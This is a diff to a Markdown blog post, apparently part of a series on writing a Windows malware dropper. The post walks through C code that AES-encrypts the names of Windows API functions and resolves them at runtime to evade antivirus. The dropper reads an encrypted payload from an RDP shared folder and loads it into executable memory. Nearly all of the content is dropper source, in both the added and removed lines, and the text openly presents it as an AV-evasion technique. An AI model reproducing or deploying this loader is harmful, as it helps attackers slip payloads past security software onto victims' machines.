@@ -60,7 +60,54 @@ xxd -g1 payload_enc
 Now we must mount the folder where the payload is, in the target OS as a shared folder. 
 
 ## The Dropper
-As for the previous post the main thing to change is the way the payload is loaded in memory. 
+First thing first we define the size of our buffer
+```c
+//Define the BUFFSIZE
+  #define BUFFSIZE 512
+```
+Next we have to define the elements needed to call the ```CreateFileA``` and ```ReadFile``` functions in the encryted way.<br>
+the first elements are the pointers.
+```c
+  HANDLE (WINAPI * pCreateFileA)(
+    LPCSTR                lpFileName,
+    DWORD                 dwDesiredAccess,
+    DWORD                 dwShareMode,
+    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+    DWORD                 dwCreationDisposition,
+    DWORD                 dwFlagsAndAttributes,
+    HANDLE                hTemplateFile
+  );
+
+  BOOL (WINAPI * pReadFile)(
+    HANDLE       hFile,
+    LPVOID       lpBuffer,
+    DWORD        nNumberOfBytesToRead,
+    LPDWORD      lpNumberOfBytesRead,
+    LPOVERLAPPED lpOverlapped
+  );
+
+```
+The encrypted strings,
+```c
+  unsigned char sCreateFileA[] = { ... };
+  unsigned char sReadFile[] = { ... };
+```
+the strings decryption and the address assignment to the function pointers 
+```c
+  AESDecrypt((char *) sCreateFileA, sizeof(sCreateFileA), key, sizeof(key));
+  AESDecrypt((char *) sReadFile, sizeof(sReadFile), key, sizeof(key));
+  ...
+  pCreateFileA = GetProcAddress(GetModuleHandle(sKernel), sCreateFileA);
+  pReadFile = GetProcAddress(GetModuleHandle(sKernel), sReadFile);
+```
+Next we have to define the file ```HANDLE```, the shared path of the payload (we have to use the double backslash to avoid the escaping chars) and the payload pointer.
+
+```c
+  HANDLE hFile;
+  char path[] = "\\\\tsclient\\share\\payload_enc";
+  char* payload[BUFFSIZE] = {0};
+```
+Last but not least, as for the previous post, we must change the way the payload is loaded in memory.
 
 ```c
   // Load resources section
@@ -83,56 +130,9 @@ As for the previous post the main thing to change is the way the payload is load
   // Copy p0 to new memory buffer
   pRtlMoveMemory(exec_mem, p0, p0_len);
 ```
-In the code trunk below the Windows functions are called as pointers because of AES encryption as saw in the previous post, this techniques works very well as an AV evasion technique so we can reuse it. Now we have to change the dropper like this
+In the code trunk below, referred to the dropper of the previous post, the payload is loaded from the resources and extracted from the image but now we have an encrypted file on shared folder so we have to change the dropper like this
 
 ```c
-  //Define the BUFFSIZE
-  #define BUFFSIZE 512
-
-  ...
-  // Define the pointer to the kernel32.dll file manipuulation functions
-  HANDLE (WINAPI * pCreateFileA)(
-    LPCSTR                lpFileName,
-    DWORD                 dwDesiredAccess,
-    DWORD                 dwShareMode,
-    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-    DWORD                 dwCreationDisposition,
-    DWORD                 dwFlagsAndAttributes,
-    HANDLE                hTemplateFile
-  );
-
-  BOOL (WINAPI * pReadFile)(
-    HANDLE       hFile,
-    LPVOID       lpBuffer,
-    DWORD        nNumberOfBytesToRead,
-    LPDWORD      lpNumberOfBytesRead,
-    LPOVERLAPPED lpOverlapped
-  );
-
-  ...
-  // Define the encrypted name of the functions strings 
-  unsigned char sCreateFileA[] = { ... };
-  unsigned char sReadFile[] = { ... };
-  ...
-
-  // Decrypt the strings when needed
-  AESDecrypt((char *) sCreateFileA, sizeof(sCreateFileA), key, sizeof(key));
-  AESDecrypt((char *) sReadFile, sizeof(sReadFile), key, sizeof(key));
-  ...
-
-  // Define the path where payload is stored 
-  // (remember the double backslashes to avoid the escaping characters)
-  // the file HANDLE and the payload buffer size
-  HANDLE hFile;
-  char path[] = "\\\\tsclient\\share\\payload_enc";
-  char* payload[BUFFSIZE] = {0};
-  ...
-
-  // Populate the pointer to the functions with the GetModuleHandle call
-  pOpenProcess = GetProcAddress(GetModuleHandle(sKernel), sOpenProcess);
-  pCreateFileA = GetProcAddress(GetModuleHandle(sKernel), sCreateFileA);
-  ...
-
   // Load the payload from FS to memory
   hFile = pCreateFileA(path, 
                       GENERIC_READ,
